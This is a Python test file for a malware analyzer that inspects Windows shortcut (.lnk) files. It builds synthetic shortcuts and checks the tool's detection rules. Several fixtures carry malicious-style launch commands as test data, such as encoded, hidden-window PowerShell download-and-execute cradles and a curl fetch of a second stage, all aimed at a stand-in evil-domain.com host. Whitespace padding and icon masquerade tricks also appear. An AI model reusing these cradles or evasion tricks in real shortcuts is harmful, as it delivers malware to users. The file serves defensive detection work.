"""End-to-end tests for the Windows Shortcut (.lnk) analyzer."""

from __future__ import annotations

import base64
import struct

from ioc_hunter.analyze import analyze, detect_format
from ioc_hunter.analyze.common import AnalyzerReport, FileFormat, Severity, Verdict
from ioc_hunter.analyze.lnk import LNK_HEADER_MAGIC, analyze_lnk, is_lnk

# ---------------------------------------------------------------------------
# Minimal MS-SHLLINK builder — just enough structure to exercise every
# branch of the analyzer with valid offsets.
# ---------------------------------------------------------------------------

_CLSID = LNK_HEADER_MAGIC[4:20]

# A FILETIME for 2023-06-01 (plausible, non-zero).
_FT_2023 = (1685577600 * 10_000_000) + 116444736000000000


def _utf16_string_data(s: str) -> bytes:
    encoded = s.encode("utf-16-le")
    return struct.pack("<H", len(s)) + encoded


def _link_info(local_path: bytes | None, network_path: bytes | None) -> bytes:
    if network_path is not None:
        cnrl = struct.pack("<IIIII", 0x14 + len(network_path) + 1, 0, 0x14, 0, 0)
        cnrl += network_path + b"\x00"
        header = struct.pack("<IIIIIII", 0, 0x1C, 0x2, 0, 0, 0x1C, 0)
        body = header + cnrl + b"\x00"  # trailing CommonPathSuffix NUL
        return struct.pack("<I", len(body)) + body[4:]
    assert local_path is not None
    vol = struct.pack("<IIII", 0x11, 3, 0xDEADBEEF, 0x10) + b"\x00"
    lbp = local_path + b"\x00"
    vol_off = 0x1C
    lbp_off = vol_off + len(vol)
    header = struct.pack("<IIIIIII", 0, 0x1C, 0x1, vol_off, lbp_off, 0, lbp_off + len(lbp))
    body = header + vol + lbp + b"\x00"
    return struct.pack("<I", len(body)) + body[4:]


def _tracker_block(machine_id: bytes, mac: bytes) -> bytes:
    droid_file = struct.pack("<IHH", 0x12345678, 0x9ABC, 0x11D7) + b"\xaa\xbb" + mac
    body = (
        struct.pack("<II", 0x58, 0)
        + machine_id.ljust(16, b"\x00")[:16]
        + b"\x00" * 16  # droid volume GUID
        + droid_file
        + b"\x00" * 16  # birth volume GUID
        + b"\x00" * 16  # birth file GUID
    )
    return struct.pack("<II", 0x60, 0xA0000003) + body


def _env_block(target: str) -> bytes:
    ansi = target.encode("cp1252", errors="replace")[:259].ljust(260, b"\x00")
    uni = target.encode("utf-16-le")[:518].ljust(520, b"\x00")
    return struct.pack("<II", 0x314, 0xA0000001) + ansi + uni


def build_lnk(
    *,
    local_path: str | None = None,
    network_path: str | None = None,
    relative_path: str | None = None,
    name: str | None = None,
    working_dir: str | None = None,
    args: str | None = None,
    icon: str | None = None,
    env_target: str | None = None,
    show_command: int = 1,
    ctime: int = _FT_2023,
    wtime: int = _FT_2023,
    tracker: tuple[bytes, bytes] | None = None,
    overlay: bytes = b"",
) -> bytes:
    flags = 0x80  # IsUnicode
    if local_path is not None or network_path is not None:
        flags |= 0x02
    if name is not None:
        flags |= 0x04
    if relative_path is not None:
        flags |= 0x08
    if working_dir is not None:
        flags |= 0x10
    if args is not None:
        flags |= 0x20
    if icon is not None:
        flags |= 0x40
    if env_target is not None:
        flags |= 0x200

    header = struct.pack("<I", 0x4C) + _CLSID
    header += struct.pack("<II", flags, 0x20)  # LinkFlags, FILE_ATTRIBUTE_ARCHIVE
    header += struct.pack("<QQQ", ctime, ctime, wtime)
    header += struct.pack("<IiIH", 0, 0, show_command, 0)  # size, icon idx, showcmd, hotkey
    header += b"\x00" * 10  # Reserved1/2/3
    assert len(header) == 0x4C

    out = header
    if flags & 0x02:
        out += _link_info(
            local_path.encode("cp1252") if local_path is not None else None,
            network_path.encode("cp1252") if network_path is not None else None,
        )
    for present, value in (
        (0x04, name),
        (0x08, relative_path),
        (0x10, working_dir),
        (0x20, args),
        (0x40, icon),
    ):
        if flags & present:
            out += _utf16_string_data(value or "")
    if tracker is not None:
        out += _tracker_block(*tracker)
    if env_target is not None:
        out += _env_block(env_target)
    out += b"\x00\x00\x00\x00"  # terminal ExtraData block
    return out + overlay


def _new_report(path: str = "<mem>") -> AnalyzerReport:
    return AnalyzerReport(
        path=path,
        format=FileFormat.LNK,
        file_size=0,
        truncated=False,
        md5="0" * 32,
        sha1="0" * 40,
        sha256="0" * 64,
    )


class TestDetect:
    def test_magic_detected(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe")
        assert is_lnk(raw)
        assert detect_format(raw[:16]) is FileFormat.LNK

    def test_bad_header_finding(self):
        r = analyze_lnk(b"\x4c\x00\x00\x00" + b"\x00" * 72, report=_new_report())
        assert any(f.rule == "lnk.bad_header" for f in r.findings)

    def test_truncated_after_header_no_crash(self):
        raw = build_lnk(local_path="C:\\x.exe")[:80]
        r = analyze_lnk(raw, report=_new_report())
        assert r.format is FileFormat.LNK


class TestFieldExtraction:
    def test_target_args_icon_extracted(self):
        raw = build_lnk(
            local_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            args="-nop -w hidden -c calc",
            icon="C:\\Windows\\System32\\shell32.dll",
            working_dir="C:\\Users\\Public",
            name="Open document",
        )
        r = analyze_lnk(raw, report=_new_report())
        lnk = r.metadata["lnk"]
        assert lnk["effective_target"].endswith("powershell.exe")
        assert lnk["arguments"] == "-nop -w hidden -c calc"
        assert lnk["working_dir"] == "C:\\Users\\Public"
        assert lnk["volume_serial"] == "DEADBEEF"

    def test_tracker_machine_id_and_mac(self):
        raw = build_lnk(
            local_path="C:\\Windows\\notepad.exe",
            tracker=(b"BUILDER-PC", bytes.fromhex("00163e5d4a01")),
        )
        r = analyze_lnk(raw, report=_new_report())
        lnk = r.metadata["lnk"]
        assert lnk["machine_id"] == "BUILDER-PC"
        assert lnk["mac_address"] == "00:16:3e:5d:4a:01"
        assert any(f.rule == "lnk.tracker_provenance" for f in r.findings)

    def test_timestamp_converted(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe")
        r = analyze_lnk(raw, report=_new_report())
        assert r.timestamp == 1685577600


class TestScriptHostTarget:
    def test_powershell_target_high(self):
        raw = build_lnk(
            local_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            args="-c whoami",
        )
        r = analyze_lnk(raw, report=_new_report())
        hits = [f for f in r.findings if f.rule == "lnk.script_host_target"]
        assert hits and hits[0].severity == Severity.HIGH

    def test_relative_path_target_also_matched(self):
        raw = build_lnk(relative_path="..\\..\\Windows\\System32\\cmd.exe")
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.script_host_target" for f in r.findings)

    def test_notepad_target_clean(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe")
        r = analyze_lnk(raw, report=_new_report())
        assert not any(f.rule == "lnk.script_host_target" for f in r.findings)

    def test_bare_script_host_is_medium_not_high(self):
        # A powershell target with no arguments is also the legit Start-Menu
        # shortcut shape — flag it, but only MEDIUM so it doesn't read as
        # malicious on its own.
        raw = build_lnk(local_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
        r = analyze_lnk(raw, report=_new_report())
        hits = [f for f in r.findings if f.rule == "lnk.script_host_target"]
        assert hits and hits[0].severity == Severity.MEDIUM
        assert r.verdict is not Verdict.MALICIOUS

    def test_script_host_with_args_is_high(self):
        raw = build_lnk(local_path="C:\\Windows\\System32\\cmd.exe", args="/c whoami")
        r = analyze_lnk(raw, report=_new_report())
        hits = [f for f in r.findings if f.rule == "lnk.script_host_target"]
        assert hits and hits[0].severity == Severity.HIGH

    def test_lolbin_hidden_in_working_dir(self):
        # Real-world obfuscation: the payload rides in an over-long WORKING_DIR
        # (target itself is benign / empty) — content scan must still catch it.
        raw = build_lnk(
            local_path="C:\\Windows\\explorer.exe",
            working_dir='C:\\Windows\\System32   cmd.exe /c "powershell -nop iex(...)"',
        )
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.lolbin_in_command" for f in r.findings)


class TestArguments:
    def test_encoded_powershell_critical_and_decoded(self):
        script = "IEX (New-Object Net.WebClient).DownloadString('http://evil-domain.com/a.ps1')"
        b64 = base64.b64encode(script.encode("utf-16-le")).decode()
        raw = build_lnk(
            local_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            args=f"-nop -w hidden -enc {b64}",
        )
        r = analyze_lnk(raw, report=_new_report())
        hits = [f for f in r.findings if f.rule == "lnk.encoded_powershell"]
        assert hits and hits[0].severity == Severity.CRITICAL
        # Decoded script must flow into the shared IOC-sweep blob.
        assert b"evil-domain.com" in r.metadata.get("pdf_decoded_blob", b"")

    def test_whitespace_padding_flagged(self):
        raw = build_lnk(
            local_path="C:\\Windows\\System32\\cmd.exe",
            args="/c echo hi" + " " * 200 + "& start evil.exe",
        )
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.whitespace_padding" for f in r.findings)

    def test_oversized_arguments_flagged(self):
        raw = build_lnk(local_path="C:\\Windows\\System32\\cmd.exe", args="/c " + "A" * 300)
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.oversized_arguments" for f in r.findings)

    def test_url_in_arguments_flagged(self):
        raw = build_lnk(
            local_path="C:\\Windows\\System32\\curl.exe",
            args="https://evil-domain.com/stage2.bin -o x.bin",
        )
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.url_in_arguments" for f in r.findings)

    def test_plain_args_not_flagged(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe", args="readme.txt")
        r = analyze_lnk(raw, report=_new_report())
        arg_rules = {"lnk.encoded_powershell", "lnk.whitespace_padding", "lnk.url_in_arguments"}
        assert not arg_rules & {f.rule for f in r.findings}


class TestMasquerade:
    def test_icon_masquerade(self):
        raw = build_lnk(
            local_path="C:\\Windows\\System32\\mshta.exe",
            icon="C:\\Windows\\System32\\shell32.dll",
        )
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.icon_masquerade" for f in r.findings)

    def test_double_extension(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe")
        r = analyze_lnk(raw, report=_new_report(path="C:\\mail\\invoice.pdf.lnk"))
        assert any(f.rule == "lnk.double_extension" for f in r.findings)

    def test_hidden_window(self):
        raw = build_lnk(local_path="C:\\Windows\\System32\\cmd.exe", show_command=7)
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.hidden_window" for f in r.findings)

    def test_nonstandard_showcommand(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe", show_command=0)
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.nonstandard_showcommand" for f in r.findings)


class TestEvasionShapes:
    def test_unc_target(self):
        raw = build_lnk(network_path="\\\\10.0.0.5\\share\\payload.exe")
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.unc_target" for f in r.findings)

    def test_env_target_only(self):
        raw = build_lnk(env_target="%COMSPEC% /c evil.bat")
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.env_target_only" for f in r.findings)

    def test_overlay_payload(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe", overlay=b"MZ" + b"\x90" * 500)
        r = analyze_lnk(raw, report=_new_report())
        assert r.has_overlay
        assert r.overlay_size > 500 - 16
        assert any(f.rule == "lnk.overlay_data" for f in r.findings)

    def test_zeroed_timestamps(self):
        raw = build_lnk(local_path="C:\\Windows\\notepad.exe", ctime=0, wtime=0)
        r = analyze_lnk(raw, report=_new_report())
        assert any(f.rule == "lnk.zeroed_timestamps" for f in r.findings)


class TestDispatcherIntegration:
    def test_full_analyze_malicious(self, tmp_path):
        script = "IEX (IWR 'http://evil-domain.com/a.ps1')"
        b64 = base64.b64encode(script.encode("utf-16-le")).decode()
        raw = build_lnk(
            local_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            args=f"-nop -w hidden -enc {b64}",
            icon="C:\\Windows\\System32\\shell32.dll",
            show_command=7,
        )
        p = tmp_path / "report.pdf.lnk"
        p.write_bytes(raw)
        r = analyze(p)
        assert r.format is FileFormat.LNK
        assert r.verdict is Verdict.MALICIOUS
        techniques = {t for f in r.findings for t in f.mitre}
        assert "T1204.002" in techniques  # malicious file
        assert "T1059.001" in techniques  # PowerShell
        assert "T1564.003" in techniques  # hidden window
        # Decoded -enc payload surfaces the C2 URL as an IOC.
        assert any("evil-domain.com" in ioc.value for ioc in r.iocs)

    def test_full_analyze_clean(self, tmp_path):
        raw = build_lnk(
            local_path="C:\\Program Files\\App\\app.exe",
            working_dir="C:\\Program Files\\App",
            name="My App",
        )
        p = tmp_path / "app.lnk"
        p.write_bytes(raw)
        r = analyze(p)
        assert r.format is FileFormat.LNK
        assert r.verdict is Verdict.CLEAN
